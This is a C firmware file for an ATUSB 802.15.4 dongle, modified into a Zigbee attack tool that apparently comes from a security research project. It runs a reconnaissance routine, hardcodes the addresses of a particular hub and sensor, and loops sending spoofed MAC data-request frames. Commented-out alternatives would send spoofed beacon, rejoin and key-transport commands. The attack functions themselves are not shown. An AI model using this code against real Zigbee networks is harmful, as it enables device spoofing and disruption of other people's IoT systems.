/*
 * fw/atusb.c - ATUSB initialization and main loop
 *
 * Written 2008-2011 by Werner Almesberger
 * Copyright 2008-2011 Werner Almesberger
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 */

#ifndef F_CPU
#define F_CPU   8000000UL
#endif

#include <stdint.h>

#include <avr/io.h>
#include <avr/sleep.h>
#include <avr/interrupt.h>
#include <util/delay.h>

#include "usb.h"

#include "board.h"
#include "sernum.h"
#include "spi.h"
#include "atusb/ep0.h"

#include "attack.h"


int main(void)
{
	board_init();
	board_app_init();
	reset_rf();

	user_get_descriptor = sernum_get_descr;

	/* now we should be at 8 MHz */

#ifdef DEBUG
	uart_init();
	static FILE atben_stdout = FDEV_SETUP_STREAM(uart_write_char, NULL,
						     _FDEV_SETUP_WRITE);
	stdout = &atben_stdout;
#endif

	usb_init();
	ep0_init();
#ifdef ATUSB
	timer_init();

	/* move interrupt vectors to 0 */
	MCUCR = 1 << IVCE;
	MCUCR = 0;
#endif

	sei();
	_delay_ms(3000);

	

	// TODO: Here we need to implement Reconnaissance Attack first to determine device types and device address in the netwrok.
	reconnaissance_attack();

	/** TEST FIELD **/

	uint8_t attack_no = 1;
	// Here we let dst_device = hub, src_device = sensor to test our API
	ieee802154_addr hub_addr = {};
	hub_addr.pan = 0x2ca2;
	hub_addr.epan = 0x0ab4da5c2ea6d3ec;
	hub_addr.short_addr = 0x0000;
	hub_addr.long_addr = 0x286d970002054a14;

	ieee802154_addr sensor_addr = hub_addr;
	sensor_addr.short_addr = 0x2d38;
	sensor_addr.long_addr = 0x286d9700010d8ebc;

	// Finally as the user, whenever we send commands, we need to determine whether we will
	// start RX_AACK mode.
	rx_aack_config aack_config = {};
	aack_config.aack_flag = 0;
	aack_config.dis_ack = 0;
	aack_config.pending = 0;
	aack_config.target_short_addr.addr = hub_addr.short_addr;
	aack_config.target_pan_id.addr = hub_addr.pan;

	/** END OF TEST FIELD **/

	while (1)
	{
		if (attack_no == 1)
		{
			_delay_ms(2000);
			led(1);
			send_zbee_cmd(ZBEE_MAC_CMD_DATA_RQ, 0, &hub_addr, &sensor_addr, &aack_config);
			// send_zbee_cmd(ZBEE_MAC_CMD_BEACON_RQ, 0, &sensor_addr, &hub_addr, &aack_config);
			// send_zbee_cmd(ZBEE_MAC_CMD_BEACON_RP, 0, &sensor_addr, &hub_addr, &aack_config);
			// send_zbee_cmd(ZBEE_NWK_CMD_REJOIN_RQ, 0, &hub_addr, &sensor_addr, &aack_config);
			// send_zbee_cmd(ZBEE_NWK_CMD_REJOIN_RP, 0, &sensor_addr, &hub_addr, &aack_config);
			// send_zbee_cmd(ZBEE_APS_CMD_KEY_TRANSPORT, 1, &sensor_addr, &hub_addr, &aack_config);
			_delay_ms(2000);
			led(0);
		}
		else
		{
			sleep_mode();
		}
		
	}
}
